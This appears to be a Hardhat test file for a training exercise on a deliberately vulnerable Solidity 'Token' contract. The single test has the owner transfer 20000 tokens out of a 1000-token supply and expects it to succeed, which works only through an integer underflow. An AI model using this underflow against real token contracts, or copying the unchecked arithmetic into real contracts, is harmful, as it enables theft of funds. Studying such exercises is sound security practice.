import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { Token } from "../../typechain";

describe("TokenAttack", function () {
  let TokenFactory;
  let token: Token;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  const initialSupply = 1000;

  beforeEach(async function () {
    TokenFactory = await ethers.getContractFactory("Token");
    [owner, attacker] = await ethers.getSigners();
    token = await TokenFactory.connect(owner).deploy(initialSupply);
  });

  describe("attack", function () {
    it("should transfer any amount", async function () {
      await token.connect(owner).transfer(attacker.address, 20000);

      const balance = await token.balanceOf(attacker.address);

      expect(balance).to.equals(20000);
    });
  });
});
